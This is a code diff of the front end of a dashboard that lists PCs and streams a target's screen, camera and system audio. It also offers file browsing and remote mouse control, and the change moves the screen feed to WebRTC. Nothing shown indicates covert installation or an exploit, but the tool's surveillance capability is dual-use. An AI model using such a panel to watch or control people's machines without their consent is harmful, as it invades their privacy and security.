@@ -52,7 +52,6 @@
     </div>
 
     <video id="preview-video" autoplay muted playsinline class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #ffc107; border-radius: 8px; background: black;"></video>
-    <img id="preview-img" class="hidden" style="width: 90%; max-width: 1000px; margin-top: 20px; border: 2px solid #28a745; border-radius: 8px; background: black;">
     <br>
     <button id="backBtn" class="hidden" style="margin-top:20px; background: #dc3545;">Back to PC List</button>
 
@@ -111,9 +110,11 @@
         function stopCurrentActive() {
             if (activeType === 'screen' || activeType === 'remote') {
                 socket.emit('stop-screen', activeTarget);
-                document.getElementById('preview-img').src = "";
-                document.getElementById('preview-img').classList.add('hidden');
                 document.getElementById('remote-tools').classList.add('hidden');
+                if (peerConnection) peerConnection.close();
+                peerConnection = null;
+                document.getElementById('preview-video').srcObject = null;
+                document.getElementById('preview-video').classList.add('hidden');
             } else if (activeType === 'camera') {
                 socket.emit('stop-camera', activeTarget);
                 if (peerConnection) peerConnection.close();
@@ -136,7 +137,9 @@
             if (activeType === 'screen') return;
             stopCurrentActive();
             activeType = 'screen';
-            document.getElementById('preview-img').classList.remove('hidden');
+            document.getElementById('preview-video').classList.remove('hidden');
+            // Unmute the video to hear the system sound!
+            document.getElementById('preview-video').muted = false;
             document.getElementById('title').innerText = "Viewing Screen: " + activeTarget;
             socket.emit('request-screen', activeTarget);
         };
@@ -145,7 +148,9 @@
             if (activeType === 'remote') return;
             stopCurrentActive();
             activeType = 'remote';
-            document.getElementById('preview-img').classList.remove('hidden');
+            document.getElementById('preview-video').classList.remove('hidden');
+            // Unmute for remote control too
+            document.getElementById('preview-video').muted = false;
             document.getElementById('remote-tools').classList.remove('hidden');
             document.getElementById('title').innerText = "Remote Controlling: " + activeTarget;
             socket.emit('request-screen', activeTarget); // Remote uses screen feed
@@ -255,7 +260,6 @@
         document.getElementById('backBtn').onclick = () => {
             document.getElementById('clientsList').classList.remove('hidden');
             document.getElementById('preview-video').classList.add('hidden');
-            document.getElementById('preview-img').classList.add('hidden');
             document.getElementById('file-browser').classList.add('hidden');
             document.getElementById('controls').classList.add('hidden');
             document.getElementById('backBtn').classList.add('hidden');
@@ -268,17 +272,7 @@
             activeType = null;
         };
 
-        let screenRes = { width: 1920, height: 1080 }; // Fallback
-
-        socket.on('screen-frame', (data) => {
-            if (data.from === activeTarget) {
-                document.getElementById('preview-img').src = data.frame;
-                if (data.width && data.height) {
-                    screenRes.width = data.width;
-                    screenRes.height = data.height;
-                }
-            }
-        });
+        // Removed screenRes and screen-frame since we use WebRTC now
 
         function mapCoordinates(e, img) {
             const relX = e.offsetX / img.clientWidth;
@@ -290,7 +284,7 @@
         }
 
         let lastMoveTime = 0;
-        document.getElementById('preview-img').onmousemove = (e) => {
+        document.getElementById('preview-video').onmousemove = (e) => {
             if (activeType !== 'remote') return;
             const now = Date.now();
             if (now - lastMoveTime < 60) return; // Throttle to ~16 FPS to avoid lag
@@ -303,7 +297,7 @@
             });
         };
 
-        document.getElementById('preview-img').onclick = (e) => {
+        document.getElementById('preview-video').onclick = (e) => {
             if (activeType !== 'remote') return;
             const coords = mapCoordinates(e, e.target);
             socket.emit('remote-action', { 
@@ -313,7 +307,7 @@
         };
 
         // Handle native right-click on the remote screen
-        document.getElementById('preview-img').oncontextmenu = (e) => {
+        document.getElementById('preview-video').oncontextmenu = (e) => {
             if (activeType !== 'remote') return;
             e.preventDefault(); // Stop local browser right-click menu
             const coords = mapCoordinates(e, e.target);
